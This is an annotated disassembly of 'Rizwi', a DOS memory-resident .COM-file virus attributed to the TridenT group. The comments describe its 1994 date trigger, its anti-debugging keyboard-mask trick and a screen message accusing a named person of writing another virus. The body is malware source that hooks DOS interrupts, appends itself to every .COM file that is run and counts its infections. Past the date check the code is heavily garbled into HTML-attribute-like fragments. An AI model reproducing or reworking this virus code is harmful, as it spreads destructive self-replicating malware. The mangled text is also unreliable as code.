

;Rizwi Virus from the TridenT research group.  
;Memory resident .COM infector.

;This virus is only active after the spring of 1994.
;When active,  it infects .COM files on execution, and keeps
;track of the number of files that it has infected.  While it has
;infected between 0C8h and 0f0h files, it displays the message
;that " Righard Zwienenberg made the DUTCH-555 virus!!! " on
;the screen.

;This virus has some anti-debugging code, as it masks the keyboard
;interrupt and checks to see if it remaines masked, so when debugging
;through it one must jump over these sections of code (In/Out port 21h
;and the checking of ax accompanying them).

;Disassembly by Black Wolf
  
.model tiny
.code

		org     100h
  
start:
		call    Get_Offset
Get_Offset:
		pop     bp
		sub     bp,offset Get_Offset
		
		mov     ah,30h
		int     21h                     ;Get Dos version/Install Check
			   
		cmp     bx,4243h
		je      DoneInstall             ;Already Installed

		mov     ah,2Ah
		int     21h                     ;Get date
			      
		in      al,21h                  ;Read interrupt masks...
		
		cmp     cx,1993                 ;Is year later than 1993?
		ja      GoMemRes                ;If not, exit.

		cmp     dh,4
		ja      GoMemRes                ;Is month < may,="" exit.="" doneinstall:="" db="" 0e9h,74h,0="" ;jmp="" returntohost="" gomemres:="" or="" al,2="" push="" ax="" mov="" ax,351ch="" int="" 21h="" ;get="" timer="" interrupt="" mov="" cs:[int1cip+bp],bx="" mov="" cs:[int1ccs+bp],es="" pop="" ax="" out="" 21h,al="" ;interrupt="" -="" disable="" keyboard?="" setinterrupts:="" mov="" ax,3521h="" int="" 21h="" ;get="" int="" 21="" address="" mov="" word="" ptr="" cs:[oldint21+bp],bx="" mov="" word="" ptr="" cs:[oldint21+2+bp],es="" in="" al,21h="" and="" al,2="" push="" ax="" mov="" ax,cs="" dec="" ax="" mov="" ds,ax="" ;set="" ds="MCB" cmp="" byte="" ptr="" ds:0,'z'="" ;are="" we="" at="" the="" end="" of="" the="" jne="" returntohost="" ;memory="" chain?="" ;sub="" word="" ptr="" ds:[3],27h="" ;decrease="" mcb="" size="" db="" 81h,2eh,03,0,27h,0="" ;sub="" word="" ptr="" ds:[12h],27h="" ;decrease="" psp="" top="" of="" memory="" db="" 81h,2eh,12h,0,27h,0="" lea="" si,[bp+100h]="" ;si="beginning" of="" virus="" mov="" di,100h="" ;di="new" offset="" (100h)="" pop="" ax="" cmp="" al,2="" ;did="" someone="" skip="" interrupt="" jne="" setinterrupts="" ;disabling="" code?="" if="" so,="" ;loop="" them="" back="" to="" redo="" ;interrupt="" setting.="" mov="" ax,ds:[12h]="" ;get="" free="" segment="" sub="" ax,10h="" ;subtract="" 10h="" to="" account="" for="" mov="" es,ax="" ;="" offset="" of="" 100h="" mov="" cx,263h="" push="" cs="" pop="" ds="" rep="" movsb="" ;copy="" virus="" into="" memory="" in="" al,21h="" xor="" al,2="" push="" es="" pop="" ds="" out="" 21h,al="" ;do="" the="" keyboard="" int="" again...="" mov="" ax,251ch="" mov="" dx,offset="" int1chandler="" int="" 21h="" ;set="" int="" 1ch="" mov="" ax,2521h="" mov="" dx,offset="" int21handler="" int="" 21h="" ;set="" int="" 21h="" returntohost:="" push="" cs="" ;restore="" seg="" regs="" pop="" ds="" push="" ds="" pop="" es="" mov="" di,100h="" push="" di="" lea="" si,[bp+storage_bytes]="" ;storage="" bytes="" movsw="" movsb="" ;restore="" host="" ret="" storage_bytes:="" int="" 20h="" popf="" trident_id="" db="" '[trident]'="" fakeint21h:="" pushf="" call="" dword="" ptr="" cs:oldint21="" ;fake="" interrupt="" 21h="" retn="" virusversion="" db="" '{v1.1="" bugfix}'="" oldint21="" dw="" 0,="" 0="" int21handler:="" cmp="" ax,4b00h="" je="" isexecute="" cmp="" ah,30h="" jnz="" exitint21="" call="" fakeint21h="" mov="" bx,4243h="" iret="" exitint21:="" jmp="" dword="" ptr="" cs:oldint21="" isexecute:="" push="" ax="" bx="" cx="" dx="" si="" di="" ds="" es="" bp="" ds="" dx="" mov="" ax,4300h="" call="" fakeint21h="" ;get="" attributes="" mov="" fileattribs,cx="" ;save="" them="" xor="" cx,cx="" mov="" ax,4301h="" ;reset="" attributes="" call="" fakeint21h="" mov="" ax,3d02h="" ;open="" file="" call="" fakeint21h="" mov="" filehandle,ax="" xchg="" ax,bx="" mov="" ax,5700h="" call="" fakeint21h="" ;get="" file="" date/time="" mov="" cs:[filetime],cx="" ;="" and="" save="" them="" mov="" cs:[filedate],dx="" and="" cx,1fh="" cmp="" cx,1fh="" ;check="" infection="" in="" time="" stamp="" jne="" infect_file="" closefile:="" mov="" ah,3eh="" call="" fakeint21h="" pop="" dx="" ;pop="" filename="" address="" pop="" ds="" mov="" cx,fileattribs="" mov="" ax,4301h="" call="" fakeint21h="" ;reset="" attributes="" db="" 0e9h,="" 67h,="" 0="" ;jmp="" doneinfect="" infect_file:="" mov="" ah,3fh="" push="" cs="" pop="" ds="" mov="" dx,offset="" storage_bytes="" mov="" cx,3="" call="" fakeint21h="" ;read="" in="" first="" 3="" bytes="" cmp="" word="" ptr="" cs:[storage_bytes],4d5ah="" ;is="" exe?="" je="" closefile="" cmp="" word="" ptr="" cs:[storage_bytes],5a4dh="" ;is="" alternate="" exe?="" je="" closefile="" mov="" ax,4202h="" xor="" cx,cx="" xor="" dx,dx="" call="" fakeint21h="" ;go="" to="" the="" end="" of="" file="" sub="" ax,3="" ;adjust="" size="" for="" jump="" mov="" word="" ptr="" [jumpsize],ax="" ;save="" jump="" size="" mov="" ah,40h="" mov="" dx,100h="" mov="" cx,263h="" call="" fakeint21h="" ;append="" virus="" to="" host="" mov="" ax,4200h="" xor="" cx,cx="" xor="" dx,dx="" ;go="" to="" beginning="" call="" fakeint21h="" ;of="" host="" file.="" mov="" ah,40h="" mov="" dx,358h="" mov="" cx,3="" call="" fakeint21h="" ;write="" jump="" bytes="" mov="" ax,5701h="" mov="" cx,[filetime]="" mov="" dx,[filedate]="" or="" cx,1fh="" ;mark="" infection="" in="" time="" stamp="" call="" fakeint21h="" ;restore="" time/date="" inc="" byte="" ptr="" cs:[counter]="" ;activation="" counter...="" jmp="" short="" closefile="" doneinfect:="" pop="" bp="" es="" ds="" di="" si="" dx="" cx="" bx="" ax="" jmp="" exitint21="" int1cip="" dw="" 0="" int1ccs="" dw="" 0="" int1chandler:="" ;while="" infections="" are="" between="" c8h="" and="" f0h,="" ;stick="" message="" on="" screen="" every="" once="" in="" a="" while.="" pushf="" push="" ax="" cx="" si="" di="" ds="" es="" cmp="" byte="" ptr="" cs:[counter],0c8h="" jb="" exitint1c="" cmp="" byte="" ptr="" cs:[counter],0f0h="" ja="" exitint1c="" cmp="" word="" ptr="" cs:[timercount],5000h="" je="" writemessagetoscreen="" inc="" word="" ptr="" cs:[timercount]="" db="" 0e9h,16h,0="" ;jmp="" exitint1c="" writemessagetoscreen:="" push="" cs="" pop="" ds="" mov="" ax,0b800h="" ;text="" screen="" memory="" mov="" es,ax="" mov="" si,offset="" message="" mov="" di,0a0h="" db="" 81h,0efh,62h,0="" ;sub="" di,endmessage-message="" mov="" cx,endmessage-message="" rep="" movsb="" exitint1c:="" pop="" es="" ds="" di="" si="" cx="" ax="" popf="" iret="" ;message="" says="" "="" righard="" zwienenberg="" made="" the="" dutch-555="" virus!!!="" "="" ;capital="" o's="" are="" attribute="" values....="" message:="" db="" '="" oroiogohoaorodo="" ozowoioeonoeono'="" db="" 'boeorogo="" omoaodoeo="" otohoeo="" odouo'="" db="" 'tocoho-o5o5o5o="" ovoiorouoso!o!o!o'="" db="" '="" o'="" endmessage:="" counter="" db="" 0="" timercount="" dw="" 0="" jumpbytes="" db="" 0e9h="" jumpsize="" dw="" 0="" fileattribs="" dw="" 0="" filehandle="" dw="" 0="" filedate="" dw="" 0="" filetime="" dw="" 0="" end="" start="">